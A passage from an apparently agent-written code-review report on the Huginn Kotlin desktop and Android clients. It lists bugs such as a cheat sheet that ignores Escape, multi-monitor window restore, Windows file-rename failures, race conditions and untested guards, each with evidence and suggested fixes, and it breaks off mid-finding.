Main.kt:378-393, the window key handler:

  val overlay = paletteOpen.value || cheatsOpen.value
  val shortcut = keyName(e.key)?.let { match(...) }
  when {
      overlay -> false          // <- 383: every key, including ESCAPE and F1, is dropped
      shortcut == null -> false
      ...
      shortcut == Shortcut.CHEATSHEET -> { cheatsOpen.value = true; true }

The Cheatsheet composable has no key handling and nothing focusable — CommandPalette.kt:183-208 is a Box with only `.clickable { onDismiss() }` on the scrim and a Surface with `.clickable {}` to swallow clicks. Its own text, CommandPalette.kt:204:

  Muted("Esc or F1 closes this.", Modifier.padding(top = Space.gutter))

The palette is fine and is the proof this is an oversight rather than a design: CommandPalette.kt:69/75/115 give it a FocusRequester, request focus on open, and handle `Key.Escape -> { onDismiss(); true }` in its own onPreviewKeyEvent. Menus.kt:109-115 does the same for context menus ("Escape closes. The Popup is focusable so the key lands here"). Only the cheat sheet has neither.
```

</details>

**Suggested fix:** Give Cheatsheet the same treatment the palette already has: a FocusRequester + `.focusable()` on the card and an `onPreviewKeyEvent` that closes on Escape and F1. Alternatively, before the `overlay -> false` arm in Main.kt, add `overlay && (shortcut == Shortcut.BACK || shortcut == Shortcut.CHEATSHEET) -> { paletteOpen.value = false; cheatsOpen.value = false; true }`.

### `mobile/app-desktop/src/main/kotlin/com/silencelen/huginn/desktop/PaneLeaseHolder.kt:57`

PaneLeaseHolder — the single object responsible for handing back every tmux window-size lease on every exit path — has no test, and cannot easily get one because HuginnClient is a final class with no interface seam.

**lane** test coverage map — find the next TermKeys · **contract** C6 · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Someone removes the `withContext(NonCancellable)` wrapper while refactoring the collectLatest that calls reconcile (it reads like defensive boilerplate). Hiding the window cancels the release mid-HTTP-call: `held` is already null, so nothing retries, and the owner's tmux window stays pinned at the desktop client's geometry. The daemon's `sweepStrandedSizes` only fires on daemon startup/shutdown, so the shrunken window persists until the 90s lease lapses on every hide — or indefinitely if the client keeps polling. No test goes red.

<details><summary>Evidence</summary>

```
RAN across all Kotlin test sources: `PaneLeaseHolder` 0 mentions. The sibling pure rule IS tested (PaneLeaseTest, in :core, covering PaneLease.toRelease); the thing that actually issues the wire call is not. Untested behaviours, each documented as load-bearing in the file: the NonCancellable wrapper (line 62, "the release for 'hidden' would be cancelled by the very next thing that happens... leaving `held` already cleared and the window still manual"); release-before-acquire ordering (line 66); `held = null` BEFORE the call so a throwing release still clears belief (line 68); the mutex serialising a minimize against an in-flight resize (line 39); and `releaseBlocking`'s 2s bound (line 104). The seam problem: core/.../HuginnClient.kt:46 is `class HuginnClient(` — final, not open, no interface — so a test cannot substitute a fake client, which is the mechanical reason this file has no test while WindowLayout (a pure object) does.
```

</details>

**Suggested fix:** Extract the two methods PaneLeaseHolder actually uses (`releaseSize`, and whatever takes the lease) into a small interface in :core that HuginnClient implements, then test PaneLeaseHolder against a recording fake: assert release-then-acquire ordering, exactly-one release per hold, `held == null` after a throwing release, and that a cancelled caller scope still completes the release.

### `mobile/app-desktop/src/main/kotlin/com/silencelen/huginn/desktop/Presence.kt:81`

The presence grace window can never expire while the window holds focus, so a Huginn window left focused on an unattended machine claims the notification route indefinitely and suppresses the household Telegram fallback — the exact harm C7 exists to prevent.

**lane** :app-desktop (Compose Desktop shell) — correctness, security, lifecycle · **contract** C7 · **verdict** not separately verified

**What goes wrong:** Owner leaves the Huginn Desktop window focused on his second monitor and goes to bed without locking (or the window manager keeps focus through a screen blank). presenceTicker refreshes lastFocusedAt every 30s, `present` stays true all night, the watch stream keeps re-sending the notify claim on every keepalive, and the daemon holds back the Telegram fallback for the whole period. At 02:00 a session hits an approval prompt: the toast fires into an empty room, Telegram never sends, and the session is still blocked in the morning.

<details><summary>Evidence</summary>

```
Presence.kt:80-83:

  fun tick() {
      if (focused) lastFocusedAt = nowMs()
      recompute()
  }

and Presence.kt:93-99:

  private fun recompute() {
      val attended = focused || (lastFocusedAt > 0 && nowMs() - lastFocusedAt < graceMs)
      val next = _visible.value && attended

`focused` is set only by window focus events (Main.kt:417-422 `snapshotFlow { windowInfo.isWindowFocused }`), and AppStore.presenceTicker() calls tick() every 30s forever (AppStore.kt:417-425). So while the OS reports the window focused, `attended` is true on the first disjunct and `lastFocusedAt` is refreshed on every tick — there is no path by which a focused window ever becomes unattended, whatever the human is doing. The class header itself only claims "this window had focus recently" as the signal (Presence.kt:24-28), i.e. there is no input-idle input at all; the Electron client used powerMonitor.getSystemIdleTime() for this.

The claim rides on every request: AppStore.kt:61 `canNotifyProvider = { settings.notifyEnabledNow() && presence.present.value }`, and PresenceTest.kt has no case for focused-and-abandoned — its only walk-away case (`losing presence also forces a reconnect`, line 59) explicitly calls `p.setFocused(false)` first.
```

</details>

**Suggested fix:** Make the claim input-aware rather than focus-aware. Install an AWTEventListener for KEY_EVENT_MASK|MOUSE_EVENT_MASK|MOUSE_MOTION_EVENT_MASK and feed it into Presence as `noteInput()`; then `attended = nowMs() - max(lastFocusedAt, lastInputAt) < graceMs` with no bare `focused ||` disjunct, so a focused-but-untouched window drops the claim after the grace window like a blurred one does. Add the regression test PresenceTest is missing: focused, visible, no input, clock += graceMs+1, tick() -> present == false.

### `mobile/app-desktop/src/main/kotlin/com/silencelen/huginn/desktop/WindowLayout.kt:65`

Window restore is validated against the PRIMARY display only, so on a multi-monitor desk any saved position outside the primary's rectangle is discarded and the window is re-centred on the primary at every launch — and a window wider than the primary is shrunk to it.

**lane** :app-desktop (Compose Desktop shell) — correctness, security, lifecycle · **verdict** not separately verified

**What goes wrong:** Owner runs a 1920x1080 primary with a 2560-wide second monitor to its right and keeps Huginn Desktop parked on the second monitor at x=2200, sized 2200x1300. He quits (or the installer force-closes it during a self-update). The setting is saved correctly. On relaunch, restore() sees screenW=1920, computes 2280 not in 0..1920, drops the position, and clamps the size to 1920x1080 — so the window opens centred on the primary at the wrong size. This repeats on every launch, and "restart" for this always-on client mostly happens after an update or a crash, which the header itself calls "exactly when landing somewhere other than where you were costs the most".

<details><summary>Evidence</summary>

```
Main.kt:251-258 supplies the bound:

  val screen = runCatching { java.awt.Toolkit.getDefaultToolkit().screenSize }.getOrNull()
  WindowLayout.restore(settings.windowLayout.value, screen?.width ?: 0, screen?.height ?: 0)

`Toolkit.getScreenSize()` reports the DEFAULT (primary) screen device's size, not the virtual-desktop bounds — it has no notion of a monitor at x=1920 or at a negative x. WindowLayout.kt:60-73 then treats that single rectangle as the whole world:

  val fitW = w.coerceAtMost(screenW)
  val fitH = h.coerceAtMost(screenH)
  ...
  val onScreen = saved.x + VISIBLE_MARGIN in 0..screenW &&
      saved.y in 0..(screenH - VISIBLE_MARGIN / 2)
  return if (onScreen) { ... } else {
      // The display it remembers is gone. Centring is better than clamping
      WindowLayout(UNPLACED, UNPLACED, fitW, fitH, saved.maximized)
  }

With a 1920x1080 primary and a saved x of 2400 (a second monitor to the right), `2400 + 80 = 2480` is not in `0..1920`, so `placed` is thrown away. A monitor to the LEFT is worse: its x coordinates are negative and fail the same test. The file's own header (WindowLayout.kt:5-13) names precisely this class of failure as the one it exists to prevent, so the intent is clear and the input is wrong.
```

</details>

**Suggested fix:** Compute the union of all screen devices instead of the primary: iterate `GraphicsEnvironment.getLocalGraphicsEnvironment().screenDevices` accumulating `defaultConfiguration.bounds` into a virtual rectangle, and change restore() to take (minX, minY, maxX, maxY) so it can accept negative and beyond-primary coordinates. Keep the VISIBLE_MARGIN title-bar reachability test, but apply it against that union. Add LandingTest/WindowLayoutTest cases for a monitor to the right (x=2400 on a 1920 primary within a 4480-wide virtual desktop) and one to the left (x=-1500).

### `mobile/app-desktop/src/main/kotlin/com/silencelen/huginn/desktop/notify/NotifyRouter.kt:95`

NotifyRouter's generation guard — the sole mechanism preventing a permanently stranded 'needs you' toast — has no test, even though the class was deliberately split so its sibling NotifyRules could be tested.

**lane** test coverage map — find the next TermKeys · **contract** C7 · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** An `&&` is changed to `||`, or the second clause is dropped as 'redundant' (it looks redundant: `gen != generation` is true on almost every enrichment because digests arrive constantly). A session is answered from the phone during the ~200ms `/screen` fetch; the withdraw fires first, then the stale enrichment posts. The owner has a permanent 'jtyper needs you' toast on the desktop pointing at a question that no longer exists, and no digest will ever withdraw it because its withdraw already happened. 188 :app-desktop tests stay green.

<details><summary>Evidence</summary>

```
RAN across all Kotlin test sources: `NotifyRouter` appears exactly once, and only inside a prose comment (NotifyRulesTest.kt:14 "splitting [NotifyRules] out of [NotifyRouter]"). Zero test constructs it. The untested guard is NotifyRouter.kt:95-97:
  synchronized(lock) {
      if (gen != generation && latestSessions[session] != NotifyRules.ATTENTION) return
  }
The class header (lines 17-30) states the stake: "its withdraw edge then arrives BEFORE the post it was meant to cancel. The result is a 'needs you' that nothing will ever take down". Every collaborator is injected as a lambda — `notifier: () -> Notifier`, `fetchPrompt: suspend (String) -> PanePrompt?`, `enabled: () -> Boolean`, `focusedTarget: () -> NavTarget?` — so the class is constructible in a unit test with no clock, network or tray. The other untested branches in the same file: PROMPT_FETCH_CAP suppression (`enrich = attentionCount in 1..PROMPT_FETCH_CAP`, line 71) and the three-way button suppression at 103-108 (`!backend.supportsActions` / empty fingerprint / multiSelect).
```

</details>

**Suggested fix:** Add NotifyRouterTest with a fake Notifier recording post/withdraw keys and a suspending fetchPrompt the test releases manually: (a) answer-during-fetch -> zero posts; (b) still-waiting-during-fetch -> exactly one post carrying the question; (c) 4 simultaneous attentions -> 4 posts, only PROMPT_FETCH_CAP=3 fetches; (d) multiSelect prompt -> post with empty options; (e) null/blank fingerprint -> empty options.

### `mobile/app-desktop/src/main/kotlin/com/silencelen/huginn/desktop/ui/Lists.kt:206`

Desktop cannot create a tmux session at all — the phone can — breaking function parity for the primary surface the owner uses.

**lane** feature parity, phone vs desktop · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Owner at the desktop wants to spin up a new Claude Code session in ~/netplan (the exact thing the phone's FAB does); the desktop offers no control, no shortcut, no palette verb — he must reach for the phone or SSH, on the machine best suited to typing the session's first instruction.

<details><summary>Evidence</summary>

```
Lists.kt:205-210 empty state: `EmptyBlock("No tmux sessions", "Sessions appear here as soon as one exists on the host; this client watches, it does not create them.")`; SessionsList's ListHeader passes an empty actions slot (`ListHeader("Sessions", sessions.size, selection.size) {}`, line 203) while ChatsList gets +Ask/+Act; grep shows `createSession` exists only in core/HuginnClient.kt:443 with zero app-desktop callers, and the palette VERBS list (Shortcuts.kt:160-165) has no new-session verb. Phone: SessionsScreen.kt:91-126 FAB + dialog -> vm.createSession.
```

</details>

**Suggested fix:** Add a '+ New' action to SessionsList's ListHeader (mirroring +Ask/+Act) opening the same name dialog pattern as RenameDialog with SESSION_NAME validation, calling store.client.createSession(name) then store.openSession(name); add a palette Verb. Client call already in :core — shell-only change, ~40 LOC.

### `mobile/app-desktop/src/main/kotlin/com/silencelen/huginn/desktop/ui/SettingsView.kt:90`

Desktop Save always pins the route and offers no unpin or pinned-state indicator, so one manual save permanently and silently disables Tailscale/Yggdrasil auto-failover.

**lane** feature parity, phone vs desktop · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Owner types the Tailscale URL into desktop Settings and hits Save while away from home -> routePinned=true persists to settings.json. Weeks later at home with Tailscale evicted (one-VPN-slot phone gotcha's desktop analog: TS daemon down), the client shows 'Not connected' at every launch; auto-resolution that would have found the Yggdrasil route never runs, nothing in the UI says why, and the only recovery is hand-editing ~/.config/.../settings.json.

<details><summary>Evidence</summary>

```
SettingsView.kt:90 `settings.selectRoute(url, pinned = true)` is the only UI path that writes the route, and grep over app-desktop shows no other caller with pinned=false and no read of `routePinned` in any view. AppStore.kt:307 `if (settings.routePinnedNow()) return` skips RouteResolver forever after. Phone has the full control set: SettingsScreen.kt:125-137 ("Find live route", "Pinned — unpin", route chips) backed by HuginnViewModel resolveRoute/selectRoute/unpinRoute (lines 588-638).
```

</details>

**Suggested fix:** In SettingsView show the pinned state, add 'Unpin — find live route' calling settings.selectRoute(url, pinned=false) plus an exposed AppStore.resolveRoute(); optionally add the phone's route chips (AppdRoutes.ALL is already in :core).

### `mobile/app-desktop/src/main/kotlin/com/silencelen/huginn/desktop/ui/SettingsView.kt:462`

The "Install and restart" button drops install()'s return value and never restarts anything, so a failed installer launch is an inert click with no message, and a successful one leaves the running app fighting its own installer for locked files.

**lane** :app-desktop (Compose Desktop shell) — correctness, security, lifecycle · **verdict** not separately verified

**What goes wrong:** Owner clicks "Install and restart". Windows Defender is mid-scan on the freshly downloaded Huginn-Desktop-Setup-0.3.2.exe and ProcessBuilder.start() throws ERROR_ACCESS_DENIED. install() returns false, nothing changes on screen, no message appears, and the button still reads "Install and restart" — indistinguishable from a click that did not register, so he clicks it three more times. In the success case, the app he just told to restart is still running: he gets an unexplained modal from the installer asking him to close an app he thought he was updating, and if he takes the default the process is force-killed with a tmux window still pinned to this window's geometry for up to 90 seconds.

<details><summary>Evidence</summary>

```
SettingsView.kt:461-463:

  (state as? UpdateState.Ready)?.let { ready ->
      Button(enabled = ready.installable, onClick = { store.updater.install() }) { Text("Install and restart") }
  }

The return value is the only failure signal there is — DesktopUpdater.kt:232-245:

  * @return false when there is nothing ready, this platform cannot install, or
  *   the launch failed. Never throws into a click handler.
  fun install(): Boolean {
      ...
      return launcher(ready.file)
  }

and DesktopUpdater.kt:276-282 `launchInstaller` is `runCatching { ProcessBuilder(...).start(); true }.getOrDefault(false)` — a throw becomes a bare `false` with no state change, so `_state` stays `Ready` and the UI keeps offering the same button. Only the missing-file case (line 240-243) sets an Error.

The restart half is asserted as the caller's job and never done — DesktopUpdater.kt:227-229: "THE CALLER MUST BE A USER ACTION — nothing in this class calls it. Quitting afterwards is the caller's job too, because only the window knows what is unsaved." Nothing in SettingsView (which has no access to Main.kt's local `quit()`) closes the app. The installer therefore always meets a running instance and must go through the whole EnsureNotRunning dance — packaging/huginn-desktop-kt.nsi:98-117 pops a modal, sends WM_CLOSE (which close-to-tray turns into a hide, per its own comment at line 77-79), sleeps 2.5s, then `taskkill /F /T`. A /F kill is TerminateProcess: the JVM shutdown hook registered at Main.kt:231-240 does not run, so the pane lease and the landing flush are both skipped.
```

</details>

**Suggested fix:** Two lines and a hoist. (1) In SettingsView, capture the result: `onClick = { if (!store.updater.install()) note = "could not start the installer — open it from ${'$'}{ready.file.absolutePath}" }`, and have DesktopUpdater.install() settle an UpdateState.Error on a false launcher result instead of returning silently. (2) Pass Main.kt's `quit()` down to SettingsView (it already takes the whole store; add a `onQuit: () -> Unit` parameter through Shell) and call it after a successful install() so the button does what it says — the lease release and landing flush then run on the ordinary path instead of being force-killed.

### `mobile/app-desktop/src/main/kotlin/com/silencelen/huginn/desktop/ui/Shell.kt:719`

The two delete-chat confirmations contradict each other and the right-click one is factually wrong: Shell's ConfirmDialog says 'Its transcript goes with it. This cannot be undone.' while ChatTopBar's dialog says 'The underlying transcript file stays on the host.' — and the daemon only deletes the chat dir, so the transcript does stay.

**lane** :ui shared composables — usability, state latches, and owner taste · **verdict** not separately verified

**What goes wrong:** Owner right-clicks a chat -> is told the transcript is destroyed and irrecoverable (may abort a cleanup they wanted, or worse, believe sensitive content was purged when the .jsonl still exists on huginn). Deleting the same chat from its top bar tells the opposite story. One of the two sentences is always lying.

<details><summary>Evidence</summary>

```
Shell.kt:719 `Triple("Delete this chat?", "Its transcript goes with it. This cannot be undone.", "Delete")` (and :723 for multi). ChatTopBar.kt:137 `Text("Removes it from huginn. The underlying transcript file stays on the host.")`. Adjudicated against appd huginn-appd.js:2963-2966: `if (req.method === 'DELETE' ...) { ... fs.rmSync(chatDir(id), { recursive: true, force: true });` where chatDir (line 639) is only /var/lib/huginn-appd digest+meta; the real Claude Code transcript lives under the WORKDIR project mapping (huginn-appd.js:981 comment) and is untouched. Also a same-verb duplication: rename+delete each have TWO independent dialog implementations (Shell's RenameDialog/ConfirmDialog for the list vs ChatTopBar's inline AlertDialogs for the open chat) that have already drifted — Shell's RenameDialog validates against SESSION_NAME/blank with an explanatory line; ChatTopBar's does neither.
```

</details>

**Suggested fix:** Route ChatTopBar's Rename/Delete through the same RenameTarget/ConfirmTarget dialogs Shell owns (one dialog per verb), and fix the copy to the appd-verified truth: the huginn-side chat record is removed; Claude's transcript file stays on the host.

### `mobile/app-desktop/src/main/kotlin/com/silencelen/huginn/desktop/update/UpdateHttp.kt:100`

KtorUpdateHttp.download has no test and finishes with `File.renameTo` — the exact call the codebase banned elsewhere after it cost the owner his token — guarded only by an unchecked `delete()`.

**lane** test coverage map — find the next TermKeys · **contract** C10 · **verdict** not separately verified

**What goes wrong:** On the owner's Windows box, a previous update attempt left Huginn-Desktop-Setup-0.3.2.exe in the download dir and Defender still holds a handle on it (routine after a partial install). `dest.delete()` returns false and is ignored; `renameTo` then refuses to replace an existing destination and returns false; `check` throws "could not move Huginn-Desktop-Setup-0.3.2.exe.part into place". The download re-runs and fails identically on every retry, and the updater's failure backoff (the '4-hour sulk' behaviour) means self-update is dead until the file is deleted by hand. On Linux the identical code is correct, which is why nobody sees it here.

<details><summary>Evidence</summary>

```
UpdateHttp.kt:99-100:
  if (dest.exists()) dest.delete()
  check(part.renameTo(dest)) { "could not move ${part.name} into place" }
The same repo forbids this in DesktopSettings.kt:378-386: "THIS COST THE OWNER HIS TOKEN. `File.renameTo` is documented as platform dependent and on Windows it does NOT replace an existing destination — it simply returns false... `Files.move(REPLACE_EXISTING)` is correct on both." DesktopSettings uses Files.move with ATOMIC_MOVE and an AtomicMoveNotSupportedException fallback; UpdateHttp does not. RAN across all Kotlin test sources: `KtorUpdateHttp` 0 mentions — UpdateFeed/UpdateManifest/Semver/Sha256/DesktopUpdater/UpdaterSchedule all have tests, the transport does not. The `dest.delete()` boolean is discarded.
```

</details>

**Suggested fix:** Replace lines 99-100 with the DesktopSettings pattern: `Files.move(part.toPath(), dest.toPath(), REPLACE_EXISTING, ATOMIC_MOVE)` with an AtomicMoveNotSupportedException fallback to REPLACE_EXISTING only. Add an UpdateHttpTest for the tail of download() against a temp dir: (a) a pre-existing dest is replaced, (b) a pre-existing dest that is read-only/locked surfaces a distinguishable error, (c) the .part file never survives a successful move.

### `mobile/app-desktop/src/test/kotlin/com/silencelen/huginn/desktop/ui/TermKeysTest.kt:243`

The test that claims to detect drift between the desktop key mapper and the daemon's accepted-key set asserts against a hand-copied duplicate of that set, so it cannot detect drift in either direction.

**lane** test coverage map — find the next TermKeys · **verdict** not separately verified

**What goes wrong:** Someone removes 'IC' from NAMED_KEYS in huginn-appd.js (or adds 'F13' to the Kotlin mapper without adding it to the daemon). `:app-desktop:test` still reports 188/188 green because `daemonAccepts` consults its own frozen literal. The break surfaces on the owner's machine as "typing in a live pane sometimes drops a whole burst of characters" — the same symptom TermKeysTest was written to prevent, one release after the mapper shipped broken for lack of any test file.

<details><summary>Evidence</summary>

```
TermKeysTest.kt:220-226 comment: "This is the daemon's set, copied deliberately: if the two ever drift, this test is what says so." The implementation at 243-252:
  /** `NAMED_KEYS` in huginn-appd.js, and the regexes beside it. */
  val ACCEPTED = setOf("Enter", "Escape", "Tab", "BTab", "Space", "BSpace", "DC", "IC", "Up", "Down", "Left", "Right", "Home", "End", "PPage", "NPage")
  fun daemonAccepts(k: String) = k in ACCEPTED || Regex("^C-[a-z]$").matches(k) || ...
Nothing in the mobile tree reads the daemon source: `grep -rln "server/appd\|huginn-appd.js" mobile/*/src` returns only UpdateFeed.kt and TermKeysTest.kt, and in both it is a prose comment. The two sets are in sync today (huginn-appd.js:625-628 is byte-identical), so this is a latent gate, not a live break.
```

</details>

**Suggested fix:** Make the test read the truth: parse `NAMED_KEYS` out of ../../server/appd/huginn-appd.js at test time (a regex over the `new Set([...])` literal) and assert the parsed set equals ACCEPTED, so a divergence fails at the copy rather than at the usage. A resolved-path miss should fail the test, not skip it.

### `mobile/app-desktop/version.txt:1`

desktop-kt 0.3.2 is a half-finished release: its code is committed, its installers were built and wine-verified, but the release aborted before staging — so /v1/desktop-kt still serves 0.3.1 and git HEAD carries 0.3.2's code under a version.txt that says 0.3.1.

**lane** documentation drift and deployed-state drift · **contract** C3 · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** The owner's installed 0.3.1 never receives the two fixes, and Settings keeps showing a stale "update check failed". Worse, HEAD is now inconsistent: a clean checkout builds 0.3.2's code and stamps BuildInfo `0.3.1`, and `release-desktop.sh` refuses at its own guard ("REFUSING: 0.3.1 is already live"), so the next person to try a release gets a confusing refusal on code that genuinely changed. If they instead force past it, a client running "0.3.1" and a client running "0.3.1" are two different programs.

<details><summary>Evidence</summary>

```
`git status --porcelain` -> ` M mobile/app-desktop/CHANGELOG.md`, ` M mobile/app-desktop/version.txt`, ` M mobile/dist/latest-debug.json`. `git diff` shows version.txt `-0.3.1` / `+0.3.2` and a new `## 0.3.2` changelog section ("Two small honesty fixes": the update-check retry and the landing-position flush on quit).
Those fixes are already COMMITTED without the bump — `git show HEAD:mobile/app-desktop/version.txt` -> `0.3.1`, while commit 9c61a61 "[dtparity] desktop-kt: stop reporting a fixed problem, and land where you left" contains exactly the 0.3.2 changes.
The release run reached the wine probe and stopped: `/opt/huginn/mobile/app-desktop/build/windows/out/Huginn-Desktop-Setup-0.3.2.exe` and `build/compose/binaries/main/deb/huginn-desktop-kt_0.3.2-1_amd64.deb` exist (Aug 4 13:25-13:27), the wine probe wrote `/root/.wine-huginn-kt/.../\.config/huginn-desktop-kt/settings.json` at 13:29 (the script's pass condition, release-desktop.sh:272-286) — but step 4 (`rm -rf "$DIST"; mkdir -p "$DIST"`, release-desktop.sh:339) never ran: `mobile/app-desktop/build/release/` still holds only the 0.3.1 deb/exe/manifest from Aug 3 17:54. `/var/lib/huginn-appd/desktop-kt/manifest.json` says `"version": "0.3.1"`.
The third modified file, mobile/dist/latest-debug.json, is unrelated build output: same `versionName 2.55.0`, new versionCode 18649395 from a debug assemble at 2026-08-04T13:23 (written by the Gradle export task, app/build.gradle.kts:209).
```

</details>

**Suggested fix:** Commit version.txt + CHANGELOG.md together with (or immediately after) the code they describe, and re-run `mobile/scripts/release-desktop.sh` to stage 0.3.2 into /v1/desktop-kt. Consider making the release script assert version.txt is committed and matches HEAD before it builds.

### `mobile/app/src/main/kotlin/com/silencelen/huginn/MainActivity.kt:663`

The top-bar rename-session dialog still applies the pre-widening sanitizer that squashes '-' and '.' to '_', while the VM/daemon accept them — the 07-28 'session-name route widening' fix was applied incompletely.

**lane** :app (Android shell) — correctness, lifecycle, notifications · **verdict** not separately verified

**What goes wrong:** Owner opens session 'kmp-spike' from the session view, taps Rename in the top-bar menu, edits it to 'kmp-spike2' → the dialog silently rewrites it to 'kmp_spike2' before the request, and dest is set to SessionView("kmp_spike2"); the same edit performed from the sessions-list rename dialog keeps the dash. The dashed name the user typed never reaches the daemon and nothing says so.

<details><summary>Evidence</summary>

```
MainActivity.kt:663: `val to = renameText.trim().lowercase().replace(Regex("[^a-z0-9_]"), "_")` — feeds vm.renameSession(from, to). HuginnViewModel.renameSession (line 991) validates against the widened `^[a-z0-9_][a-z0-9_.-]{0,49}$` (comment: 'Matches what the daemon will route to (NAME_RE)'), and SessionsScreen's rename dialog (SessionsScreen.kt:142) passes the typed text through raw. Two rename surfaces, different results for the same input.
```

</details>

**Suggested fix:** Delete the replace() in MainActivity's dialog and let vm.renameSession's regex be the single validator (it already toasts a clear message on rejection).

### `mobile/app/src/main/kotlin/com/silencelen/huginn/notify/HuginnMessagingService.kt:145`

The FCM claim-before-reconcile updates notifiedSessions with a non-atomic read-then-write outside dataStore.edit, and the three deliberately-concurrent watch mechanisms share the persisted baseline with no serialization, so concurrent observers can clobber each other's baseline writes.

**lane** :app (Android shell) — correctness, lifecycle, notifications · **contract** C10 · **verdict** not separately verified

**What goes wrong:** A push wakes the phone at the same moment the 10-minute alarm fires (the common Doze-exit case): FCM reads the baseline set, the alarm's apply() writes an updated set, FCM writes back its stale snapshot + subject — the alarm's removal of a resolved session is lost, so the next cycle re-detects that session as 'fresh' and re-buzzes a question that was already answered (or, in the mirror ordering, the FCM claim is lost and the reconcile double-posts the generic 'Waiting for your answer' over the real question — the exact bug the claim was added to kill).

<details><summary>Evidence</summary>

```
`settings.setNotifiedSessions(settings.notifiedSessions.first() + subject)` — the read (`first()`) is outside the `edit {}` transaction (SettingsStore.setNotifiedSessions writes the whole set). WatchNotifier.apply does the same pattern (read previouslyNeeding at line 82, whole-set overwrite at line 135) and is invoked concurrently from four unsynchronized paths: WatchService stream collect, HeartbeatReceiver.tick, SessionWatchWorker.doWork, and the FCM reconcile — WatchNotifier's own doc says 'whichever of them notices a transition first consumes it', which only holds if observers are serialized; nothing serializes them.
```

</details>

**Suggested fix:** Perform the union inside one dataStore.edit transform (edit { it[NOTIFIED] = (it[NOTIFIED] ?: emptySet()) + subject }) and wrap WatchNotifier.apply in a process-wide Mutex.

### `mobile/app/src/main/kotlin/com/silencelen/huginn/notify/WatchService.kt:237`

On Android 10-13 (API 29-33, inside minSdk 29) startForeground is called with FOREGROUND_SERVICE_TYPE_DATA_SYNC while the manifest declares only specialUse, which fails the platform's since-Q subset check and crashes the app whenever the watch service starts.

**lane** :app (Android shell) — correctness, lifecycle, notifications · **verdict** not separately verified

**What goes wrong:** Any household device on Android 10-13 enables 'Watch continuously' (or has it enabled and reboots) → WatchService.onStartCommand → startForeground throws IllegalArgumentException → app crashes, and re-crashes on every heartbeat tick that restarts the service. Owner's Fold (API 34+) is unaffected, which is why it has not been seen.

<details><summary>Evidence</summary>

```
foregroundTypeCompat(): `if (SDK >= UPSIDE_DOWN_CAKE) FOREGROUND_SERVICE_TYPE_SPECIAL_USE else FOREGROUND_SERVICE_TYPE_DATA_SYNC`; manifest declares `android:foregroundServiceType="specialUse"` only (AndroidManifest.xml:95). build.gradle.kts: minSdk=29, targetSdk=35. Since Android 10, ActiveServices throws IllegalArgumentException for targetSdk>=Q apps when the requested type is not a subset of the manifest attribute (DATA_SYNC=0x1 vs specialUse=0x40000000 → 0x1 & 0x40000000 != 0x1). The throw propagates out of startForegroundCompat/onStartCommand uncaught. BootReceiver and the heartbeat tick auto-restart the service, so the crash repeats.
```

</details>

**Suggested fix:** Either raise minSdk to 34, or declare dataSync alongside specialUse in the manifest for the <34 path (plus FOREGROUND_SERVICE_DATA_SYNC permission), or use type 0/FOREGROUND_SERVICE_TYPE_MANIFEST below 34.

### `mobile/app/src/main/kotlin/com/silencelen/huginn/ui/HuginnViewModel.kt:459`

Replacing an attachment while the first upload is still in flight lets the first upload's Ready result overwrite the replacement's Uploading state, so a quick send carries the photo the user had replaced.

**lane** :app (Android shell) — correctness, lifecycle, notifications · **contract** C10 · **verdict** not separately verified

**What goes wrong:** On a slow uplink the user attaches the wrong screenshot, immediately attaches the right one, and hits send while the chip already flipped to 'Photo attached' — the message goes out with the wrong screenshot's path and the right one's upload result is silently dropped (owner already nulled by takeAttachment).

<details><summary>Evidence</summary>

```
attachImage guards only on owner: `if (_attachmentOwner.value == owner) _attachment.value = result` — the guard passes for a SECOND attachment staged by the SAME owner. AttachButton (AttachmentUi.kt:108-160) stays enabled while the chip shows 'Uploading…', so re-staging mid-upload is reachable. Sequence: attach photo1 (slow) → attach photo2 (sets Uploading) → photo1's job completes, owner matches → slot becomes Ready(photo1.path) while photo2 is still uploading → whenAttachmentSettled sees not-Uploading → sendNow's takeAttachment consumes photo1's marker.
```

</details>

**Suggested fix:** Tag each upload job with a generation token captured at stage time and only write the result if the slot still holds that generation (same pattern as the owner check, one level finer).

### `mobile/app/src/main/kotlin/com/silencelen/huginn/ui/HuginnViewModel.kt:1214`

The session composer sends unbounded text to POST /v1/sessions/:name/keys (daemon caps at 8000 chars) and clears the draft plus consumes the staged attachment BEFORE the request, so an oversized message is destroyed on the daemon's 400.

**lane** protocol contract drift — what clients SEND vs what appd ACCEPTS · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Owner pastes a >8000-char log or prompt into the phone's session composer (with or without a staged photo) and taps send: draft and attachment claim are cleared, daemon replies 400, only a toast shows 'text too long' — the composed message and the attachment marker are gone and must be reconstructed by hand.

<details><summary>Evidence</summary>

```
Phone sendTextNow: `val att = takeAttachment(sessionDraftKey(name))` ... `clearDraft(sessionDraftKey(name))` then `viewModelScope.launch { runCatching { client.sendKeys(name, text = text, ...) }.onFailure { _toast.value = errText(it) } }` — no length check, no draft restore. Compose desktop SessionController.kt:431 sendLine is equally unbounded. Server huginn-appd.js:2698: `if (body.text.length > 8000) return sendErr(res, 400, 'text too long')`. Electron enforced this exact contract (desktop/src/shared/core/liveInput.ts:70 MAX_TEXT_PER_REQUEST=8000, toWire chunks on surrogate boundaries) — the Kotlin port that supersedes it dropped the guard. Grep confirms no maxLength/8000 cap anywhere in mobile/. RAN IT: POST 8001-char text to live daemon 2.52.2 against my scratch session → {"error":"text too long"}.
```

</details>

**Suggested fix:** Port Electron's toWire chunking into :core (split text at 8000 on a surrogate-safe boundary, send sequentially, then Enter), and on the phone restore the draft/attachment on send failure instead of clearing before the request.

### `mobile/app/src/main/kotlin/com/silencelen/huginn/ui/HuginnViewModel.kt:1463`

openChat/loadChatTranscript bypass the credentials `ready` gate, so a notification tap that cold-starts the app races the DataStore load and opens the chat as a 401 error with no reattach and no auto-retry.

**lane** :app (Android shell) — correctness, lifecycle, notifications · **verdict** not separately verified

**What goes wrong:** chat_finished push arrives with the process dead; owner taps the notification; MainActivity cold-starts, LaunchedEffect(target) fires vm.openChat on first composition while init is still suspended in settings.baseUrl.first() → both `chat` and `chatTranscript` go out with an empty bearer → chat opens showing 'Rejected by huginn: check the token in Settings' over a chat with real history, and if the run was still going it silently doesn't stream.

<details><summary>Evidence</summary>

```
